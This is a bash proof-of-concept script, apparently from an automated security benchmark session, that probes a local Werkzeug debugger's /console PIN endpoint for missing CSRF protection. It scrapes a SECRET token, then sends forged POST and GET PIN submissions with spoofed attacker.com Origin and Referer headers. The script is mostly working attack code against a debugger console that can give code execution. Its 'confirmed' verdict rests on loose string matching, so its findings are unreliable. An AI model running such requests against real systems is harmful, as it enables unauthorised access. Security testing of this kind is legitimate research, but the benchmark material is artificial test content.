#!/bin/bash
# POC: Demonstrates CSRF vulnerability on Werkzeug debugger PIN submission endpoint. Shows that POST requests to /console?cmd=pinauth lack CSRF token validation and accept requests from any origin.
# Target: ./repo
# Created: 2025-12-02T16:24:23.117Z
# Session: benchmark-XBEN-093-24-miorxjqr

# CSRF Vulnerability in Werkzeug Debugger PIN Submission
# This POC demonstrates that the /console endpoint lacks CSRF protection

TARGET_URL="http://localhost:5003"
CONSOLE_ENDPOINT="$TARGET_URL/console"

echo "[*] Testing CSRF vulnerability on Werkzeug debugger PIN endpoint"
echo "[*] Target: $CONSOLE_ENDPOINT?cmd=pinauth"
echo ""

# Step 1: Make initial request to get the SECRET token (if exposed)
echo "[*] Step 1: Fetching initial console page to inspect form..."
INITIAL_RESPONSE=$(curl -s "$CONSOLE_ENDPOINT")

# Extract SECRET if present in the response
SECRET=$(echo "$INITIAL_RESPONSE" | grep -oP 's[" ]*=[" ]*["\x27]\K[^"\x27]+' | head -1)

if [ -z "$SECRET" ]; then
    echo "[-] Could not extract SECRET from response, using placeholder"
    SECRET="placeholder_secret"
fi

echo "[+] Extracted SECRET: $SECRET"
echo ""

# Step 2: Demonstrate CSRF - Send POST request without CSRF token from "attacker origin"
echo "[*] Step 2: Attempting CSRF attack - POST to /console?cmd=pinauth without CSRF token"
echo "[*] Using a fake PIN (123456) to trigger authentication attempt"
echo ""

CSRF_TEST=$(curl -s -X POST "$CONSOLE_ENDPOINT?cmd=pinauth" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/malicious" \
  -d "cmd=pinauth&pin=123456&s=$SECRET" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$CSRF_TEST" | tail -1)
RESPONSE_BODY=$(echo "$CSRF_TEST" | head -n -1)

echo "[+] HTTP Response Code: $HTTP_CODE"
echo "[+] Response Length: $(echo "$RESPONSE_BODY" | wc -c) bytes"
echo ""

# Step 3: Check if response contains pin-prompt form (indicating no CSRF validation)
if echo "$RESPONSE_BODY" | grep -q "pin-prompt\|enter.*PIN\|debugger"; then
    echo "[+] CSRF VULNERABILITY CONFIRMED!"
    echo "[+] Response contains debugger/PIN form despite cross-origin request"
    echo "[+] No CSRF token validation is enforced"
else
    echo "[*] Response details:"
    echo "$RESPONSE_BODY" | head -20
fi

echo ""

# Step 4: Verify that GET requests also work (CSRF issue - should be POST only)
echo "[*] Step 3: Testing if GET requests are also accepted (further CSRF risk)..."
GET_TEST=$(curl -s -G "$CONSOLE_ENDPOINT" \
  -d "cmd=pinauth" \
  -d "pin=654321" \
  -d "s=$SECRET" \
  -H "Origin: http://attacker.com" \
  -w "\n%{http_code}")

GET_CODE=$(echo "$GET_TEST" | tail -1)
GET_BODY=$(echo "$GET_TEST" | head -n -1)

echo "[+] GET Request HTTP Code: $GET_CODE"

if [ "$GET_CODE" = "200" ]; then
    echo "[+] GET requests are also accepted - PIN endpoint accepts both GET and POST"
    echo "[+] This is a CSRF amplification as GET requests can be triggered via image tags"
fi

echo ""
echo "[*] POC Summary:"
echo "    - POST to /console?cmd=pinauth without CSRF token: HTTP $HTTP_CODE (accepted)"
echo "    - GET to /console?cmd=pinauth: HTTP $GET_CODE"
echo "    - Origin/Referer headers not validated"
echo "    - No CSRF token in response form"
echo "[*] Conclusion: CSRF protection is missing on debugger PIN endpoint"